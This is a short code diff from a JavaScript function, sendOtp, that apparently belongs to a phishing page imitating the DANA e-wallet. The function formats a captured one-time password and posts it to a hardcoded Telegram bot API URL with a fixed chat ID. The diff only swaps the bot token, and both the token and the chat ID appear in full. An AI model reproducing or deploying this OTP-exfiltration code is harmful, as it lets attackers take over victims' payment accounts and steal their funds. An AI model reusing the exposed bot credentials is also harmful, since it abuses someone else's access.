@@ -82,7 +82,7 @@ function sendOtp(){
 
   let text = "📬 *OTP DANA*\n`" + otp + "`";
 
-  fetch("https://api.telegram.org/bot78305780223:AAGlXjlTU5fGu4BSjq5p8ELsN3L2gIUmQQ4/sendMessage", {
+  fetch("https://api.telegram.org/bot8305780223:AAGlXjlTU5fGu4BSjq5p8ELsN3L2gIUmQQ4/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "chat_id=8495813907&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
